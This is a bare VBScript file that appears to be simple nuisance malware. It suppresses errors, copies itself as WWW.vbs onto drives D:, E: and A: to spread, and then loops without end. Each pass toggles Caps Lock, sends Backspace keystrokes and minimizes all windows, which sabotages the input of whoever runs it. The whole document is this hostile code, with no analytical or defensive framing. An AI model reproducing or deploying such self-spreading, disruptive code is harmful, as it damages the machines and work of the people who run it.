on error resume next
set a = CreateObject("Scripting.FileSystemObject")
a.copyfile "WWW.vbs","D:\WWW.vbs"
a.copyfile "WWW.vbs","E:\WWW.vbs"
a.copyfile "WWW.vbs","A:\WWW.vbs"
set b = CreateObject("WScript.Shell") 
set c = CreateObject("Shell.Application") 
do
b.sendkeys "{CAPSLOCK}"
wscript.sleep 80
b.sendkeys "{BACKSPACE}"
wscript.sleep 200
c.MinimizeAll
loop